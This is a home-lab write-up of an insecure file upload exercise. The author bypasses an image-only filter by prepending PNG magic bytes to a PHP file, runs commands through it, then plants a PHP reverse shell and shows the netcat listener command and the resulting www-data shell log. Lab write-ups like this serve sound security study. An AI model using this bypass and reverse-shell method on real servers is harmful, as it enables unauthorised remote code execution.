# Insecure File Upload - Magic Bytes

- Upon revisiting the website, I got this interface:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/7adb3cf7-0b83-48c9-9154-d8c3251e4472)

- Try to upload txt file, unfortunately, it didn't work.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/15d0269b-c87d-459c-b64f-4dd89c8ae2e6)

- I upload a png file and Intercept the request to the burp suite and there I got a request with image data.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/9e7de415-039f-46e2-9f04-7a03beb229e9)

- I try to upload a php file with php command into it, but I got failed with a message that only "png" & "jpg" files are allowed.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/cb93754b-f3d6-42fa-957f-27d15b1627fc)

- This indicated that the request is made from the server side, not client side
- So here is something I can do with the magic bytes data of a png file.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/ead3a5f3-a237-4d90-8417-34582c5056b7)

- After several attempts, I was successfully able to upload the php file with the command into it.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/ee01ec02-7852-4337-9182-d8089035be62)

- Successfully navigating to the file, and by sending the command along with the URL I got results back.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/0fa822b3-378f-4bd9-946e-47cc6c7df145)

- Let's move to get a reverse shell back into our system.
- For this, I inject a PHP reverse shell and start Netcat to capture the request.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/e53e175f-23f9-4f07-8a85-84c4c5c62d43)

- Upon navigating to the file I got the reverse shell back to my Netcat listener.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/1b101718-de18-4634-8bb4-59404f734d77)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.251.186] from (UNKNOWN) [172.18.0.4] 56618
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 06:53:53 up  3:23,  0 users,  load average: 0.39, 0.38, 0.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

### Task accomplished
